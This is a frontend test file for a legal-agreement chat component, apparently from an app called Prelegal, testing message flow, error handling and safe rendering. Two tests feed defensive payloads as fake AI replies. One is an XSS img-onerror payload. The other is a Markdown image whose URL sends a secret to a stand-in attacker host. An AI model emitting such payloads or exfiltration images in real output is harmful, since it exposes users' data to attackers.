import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import { GREETING } from "@/lib/chat";
import { emptyDraft } from "@/lib/draft";
import { chatRequests, fakeApi, turn } from "@/test-utils/fakeBackend";
import Chat from "./Chat";

function setup() {
  const user = userEvent.setup();
  const onTurn = vi.fn();
  const onFillInManually = vi.fn();
  render(<Chat draft={emptyDraft("sla")} onTurn={onTurn} onFillInManually={onFillInManually} />);
  return { user, onTurn, onFillInManually, message: screen.getByLabelText("Message"), send: screen.getByRole("button", { name: "Send" }) };
}

const bubbles = () =>
  within(screen.getByRole("list", { name: "Conversation" }))
    .getAllByRole("listitem")
    .map((li) => li.textContent);

describe("Chat", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("opens with a greeting that asks what agreement is needed, without calling the AI", () => {
    const fetchMock = fakeApi();
    setup();
    expect(bubbles()).toEqual([GREETING]);
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("sends the message and shows the AI's reply", async () => {
    fakeApi({ reply: "Thanks! Who is signing for Acme?" });
    const { user, message } = setup();
    await user.type(message, "Acme Inc and Globex LLC{Enter}");
    expect(await screen.findByText("Thanks! Who is signing for Acme?")).toBeInTheDocument();
    expect(bubbles()).toEqual([GREETING, "Acme Inc and Globex LLC", "Thanks! Who is signing for Acme?"]);
    expect(message).toHaveValue("");
  });

  it("sends the whole conversation each turn", async () => {
    const fetchMock = fakeApi({ reply: "First reply" }, { reply: "Second reply" });
    const { user, message } = setup();
    await user.type(message, "one{Enter}");
    await screen.findByText("First reply");
    await user.type(message, "two{Enter}");
    await screen.findByText("Second reply");

    expect(fetchMock).toHaveBeenCalledWith("/api/chat", expect.objectContaining({ method: "POST" }));
    expect(chatRequests(fetchMock)[1].messages).toEqual([
      { role: "assistant", content: GREETING },
      { role: "user", content: "one" },
      { role: "assistant", content: "First reply" },
      { role: "user", content: "two" },
    ]);
  });

  it("sends the draft and today's date, and passes the AI's turn up", async () => {
    const fetchMock = fakeApi({ reply: "Noted.", terms: { "Target Uptime": "99.9%" } });
    const { user, message, onTurn } = setup();
    await user.type(message, "99.9% uptime{Enter}");
    await screen.findByText("Noted.");
    const [request] = chatRequests(fetchMock);
    expect(request.draft).toEqual(emptyDraft("sla"));
    expect(request.today).toMatch(/^\d{4}-\d{2}-\d{2}$/);
    expect(onTurn).toHaveBeenCalledWith(turn({ reply: "Noted.", terms: { "Target Uptime": "99.9%" } }), [
      { role: "assistant", content: GREETING },
      { role: "user", content: "99.9% uptime" },
      { role: "assistant", content: "Noted." },
    ]);
  });

  it("continues a saved conversation", async () => {
    const fetchMock = fakeApi({ reply: "Done." });
    const user = userEvent.setup();
    const saved = [
      { role: "assistant" as const, content: "Which uptime?" },
      { role: "user" as const, content: "99.9%" },
      { role: "assistant" as const, content: "Anything else?" },
    ];
    render(<Chat draft={emptyDraft("sla")} initialMessages={saved} onTurn={vi.fn()} onFillInManually={vi.fn()} />);
    expect(bubbles()).toEqual(["Which uptime?", "99.9%", "Anything else?"]);
    await user.type(screen.getByLabelText("Message"), "No{Enter}");
    await screen.findByText("Done.");
    expect(chatRequests(fetchMock)[0].messages).toEqual([...saved, { role: "user", content: "No" }]);
  });

  it("puts the cursor back in the message box after a reply, even when Send was clicked", async () => {
    fakeApi({ reply: "Who is the provider?" });
    const { user, message, send } = setup();
    await user.type(message, "Acme is the customer");
    await user.click(send);
    await screen.findByText("Who is the provider?");
    expect(message).toHaveFocus();
  });

  it("puts the cursor back in the message box after an error", async () => {
    fakeApi({ status: 502, detail: "The AI assistant didn't respond. Please try again." });
    const { user, message, send } = setup();
    await user.type(message, "hi");
    await user.click(send);
    await screen.findByRole("alert");
    expect(message).toHaveFocus();
  });

  it("shows that the AI is thinking and blocks sending until it replies", async () => {
    let answer!: (r: Response) => void;
    vi.stubGlobal("fetch", vi.fn(() => new Promise<Response>((resolve) => (answer = resolve))));
    const { user, message, send } = setup();
    await user.type(message, "hello{Enter}");
    expect(screen.getByRole("status")).toHaveTextContent("Thinking");
    await user.type(message, "again");
    expect(send).toBeDisabled();

    answer(new Response(JSON.stringify(turn({ reply: "Hi there" }))));
    expect(await screen.findByText("Hi there")).toBeInTheDocument();
    expect(screen.queryByRole("status")).not.toBeInTheDocument();
    expect(send).toBeEnabled();
  });

  it("uses Shift+Enter for a new line instead of sending", async () => {
    const fetchMock = fakeApi();
    const { user, message } = setup();
    await user.type(message, "line one{Shift>}{Enter}{/Shift}line two");
    expect(message).toHaveValue("line one\nline two");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("does not send an empty message", async () => {
    const fetchMock = fakeApi();
    const { user, message, send } = setup();
    expect(send).toBeDisabled();
    await user.type(message, "   {Enter}");
    expect(fetchMock).not.toHaveBeenCalled();
    expect(bubbles()).toEqual([GREETING]);
  });

  it("shows the server's error and puts the message back to retry", async () => {
    fakeApi({ status: 502, detail: "The AI assistant didn't respond. Please try again." }, { reply: "Back now!" });
    const { user, message, onTurn } = setup();
    await user.type(message, "Acme Inc{Enter}");

    expect(await screen.findByRole("alert")).toHaveTextContent("The AI assistant didn't respond. Please try again.");
    expect(message).toHaveValue("Acme Inc");
    expect(bubbles()).toEqual([GREETING]);
    expect(onTurn).not.toHaveBeenCalled();

    await user.type(message, "{Enter}");
    expect(await screen.findByText("Back now!")).toBeInTheDocument();
    expect(screen.queryByRole("alert")).not.toBeInTheDocument();
  });

  it("explains when the server can't be reached", async () => {
    fakeApi(new TypeError("Failed to fetch"));
    const { user, message } = setup();
    await user.type(message, "hi{Enter}");
    expect(await screen.findByRole("alert")).toHaveTextContent("Couldn't reach Prelegal");
  });

  it("falls back to a general error when the server sends no detail", async () => {
    fakeApi({ status: 500 });
    const { user, message } = setup();
    await user.type(message, "hi{Enter}");
    expect(await screen.findByRole("alert")).toHaveTextContent("Something went wrong. Please try again.");
  });

  it("renders the AI's Markdown but shows the user's text as typed", async () => {
    fakeApi({ reply: "I need:\n\n1. **Names**\n2. Titles" });
    const { user, message } = setup();
    await user.type(message, "**not bold**{Enter}");
    const names = await screen.findByText("Names");
    expect(names.tagName).toBe("STRONG");
    expect(screen.getByText("**not bold**")).toBeInTheDocument();
  });

  it("does not render HTML sent by the AI", async () => {
    fakeApi({ reply: 'Hello <img src=x onerror="alert(1)">' });
    const { user, message } = setup();
    await user.type(message, "hi{Enter}");
    await screen.findByText(/Hello/);
    expect(document.querySelector("img")).toBeNull();
  });

  it("keeps a new draft typed while waiting if the request then fails", async () => {
    let fail!: () => void;
    vi.stubGlobal(
      "fetch",
      vi.fn(() => new Promise<Response>((_, reject) => (fail = () => reject(new TypeError("Failed to fetch"))))),
    );
    const { user, message } = setup();
    await user.type(message, "first{Enter}");
    await user.type(message, "my next answer");
    fail();
    expect(await screen.findByRole("alert")).toBeInTheDocument();
    expect(message).toHaveValue("my next answer");
  });

  it("does not load images from the AI's Markdown", async () => {
    fakeApi({ reply: "See ![tracker](https://evil.example/x.png?q=secret)" });
    const { user, message } = setup();
    await user.type(message, "hi{Enter}");
    await screen.findByText(/See/);
    expect(document.querySelector("img")).toBeNull();
  });

  describe("when the AI can't help", () => {
    it.each([
      [503, "The AI assistant is unavailable: the OpenRouter account is out of credit."],
      [503, "AI chat is not set up: OPENROUTER_API_KEY is missing."],
      [502, "The AI assistant didn't respond. Please try again."],
    ])("offers to fill in the agreement by hand after a %i", async (status, detail) => {
      fakeApi({ status, detail });
      const { user, message, onFillInManually } = setup();
      await user.type(message, "An SLA{Enter}");
      const alert = await screen.findByRole("alert");
      expect(alert).toHaveTextContent(detail);
      await user.click(within(alert).getByRole("button", { name: "Fill it in yourself" }));
      expect(onFillInManually).toHaveBeenCalledOnce();
    });

    it("doesn't offer it for other errors, such as an unreachable server", async () => {
      vi.stubGlobal("fetch", vi.fn().mockRejectedValue(new TypeError("Failed to fetch")));
      const { user, message } = setup();
      await user.type(message, "An SLA{Enter}");
      expect(await screen.findByRole("alert")).toHaveTextContent("Couldn't reach Prelegal");
      expect(screen.queryByRole("button", { name: "Fill it in yourself" })).not.toBeInTheDocument();
    });
  });
});
